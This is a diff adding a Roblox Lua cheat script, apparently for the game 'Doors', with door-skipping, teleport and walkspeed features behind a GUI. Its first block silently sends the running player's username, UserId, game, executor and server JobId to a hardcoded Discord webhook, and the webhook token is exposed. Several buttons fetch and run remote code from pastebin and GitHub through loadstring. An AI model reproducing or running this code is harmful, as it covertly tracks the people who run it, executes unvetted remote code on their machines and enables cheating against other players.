@@ -1,0 +1,174 @@
+local url = "https://discord.com/api/webhooks/1021627679331594261/9jHTLWEC8ZdNyP4XNllmSv6pFbsDyo7r-yLuSl0teK39BEqwDFv-h0gQhOjEj_cfZFIl"
+local Exploit = secure_load and "Sentinel" or pebc_execute and "ProtoSmasher" or is_sirhurt_closure and "Sirhurt" or (syn and not is_sirhurt_closure) and "Synapse X" or KRNL_LOADED and "Krnl" or identifyexploit()
+local data = 
+	{
+		["content"] = "",
+		["embeds"] = {{
+			["title"] = "Script Execution Logs",
+			["description"] = '```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```',
+			["type"] = "rich",
+			["color"] = 16711680,
+            ["footer"] = {
+                ["text"] = os.date("%c", os.time())
+            },
+			["fields"] = {
+                {
+                    ["name"] = "Username",
+                    ["value"] = "> "..game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+                {
+					["name"] = "UserId",
+					["value"] = "> "..game.Players.LocalPlayer.UserId,
+                    ["inline"] = true
+				},
+                {
+                    ["name"] = "Game",
+                    
+                    ["value"] = "> "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Executor",
+                    ["value"] = "> "..Exploit,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "JobId",
+                    ["value"] = "> "..game.JobId,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "PlaceId",
+                    ["value"] = "> "..game.PlaceId,
+                    ["inline"] = true
+                }
+			}
+		}}
+	}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+local headers = {
+["content-type"] = "application/json"
+}
+local request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+
+
+
+
+local Keybind = Enum.KeyCode.H
+local CanSkipRoom_50 = true
+local CanAutoUnlockDoors = true
+
+do
+local UIS = game:GetService("UserInputService")
+local CF = CFrame.new
+local LatestRoom = game:GetService("ReplicatedStorage").GameData.LatestRoom
+
+UIS.InputBegan:Connect(function(input, typing)
+    if typing then return end
+    if input.KeyCode == Keybind then
+        pcall(function()
+            local key = false
+            local CurrentDoor = workspace.CurrentRooms[tostring(game:GetService("ReplicatedStorage").GameData.LatestRoom.Value)]:WaitForChild("Door")
+            for i,object in ipairs(CurrentDoor.Parent:GetDescendants()) do
+                if object.Name == "KeyObtain" then
+                    key = object
+                end
+            end
+            if LatestRoom.Value == 50 and CanSkipRoom_50 == true then
+                CurrentDoor = workspace.CurrentRooms[tostring(LatestRoom.Value + 1)]:WaitForChild("Door")
+                game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
+            else
+                if key and CanAutoUnlockDoors == true then
+                    game.Players.LocalPlayer.Character:PivotTo(CF(key.Hitbox.Position))
+                    task.wait(.3)
+                    fireproximityprompt(key.ModulePrompt)
+                    task.wait(.3)
+                    game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
+					task.wait(.3)
+                    fireproximityprompt(CurrentDoor.Lock.UnlockPrompt)
+                end
+                game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
+            end
+            task.wait(.5)
+            CurrentDoor.ClientOpen:FireServer()
+        end)
+    end
+end)
+end
+
+
+
+
+
+local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/thombomb2009/butter-hub/main/lib.txt"))()
+
+local GUI = Mercury:Create{
+    Name = "Butter",
+    Size = UDim2.fromOffset(600, 400),
+    Theme = Mercury.Themes.Dark,
+    Link = "https://github.com/Butter"
+}
+
+local PlayerTab = GUI:Tab{
+	Name = "Player",
+	Icon = "rbxassetid://6023426915"
+}
+
+local WorldTab = GUI:Tab{
+	Name = "World",
+	Icon = "rbxassetid://6034287522"
+}
+
+
+PlayerTab:Button{
+	Name = "Skip all doors",
+	Description = "Once you press this button the key is H to skip",
+	Callback = function()
+    end
+}
+
+PlayerTab:Button{
+	Name = "Walkspeed ON",
+	Description = nil,
+	Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/rqA4YPzi", true))()
+    end
+}
+
+PlayerTab:Button{
+	Name = "Walkspeed OFF",
+	Description = nil,
+	Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/HFLkawSE", true))()
+    end
+}
+
+WorldTab:Button{
+	Name = "Remove Doors",
+	Description = nil,
+	Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/4m2Nw1Kr", true))()
+    end
+}
+
+WorldTab:Button{
+	Name = "Remove Fake Doors",
+	Description = nil,
+	Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/4m2Nw1Kr", true))()
+    end
+}
+
+WorldTab:Button{
+	Name = "Remove Fake Doors",
+	Description = nil,
+	Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/G3GnBCyC", true))()
+    end
+}
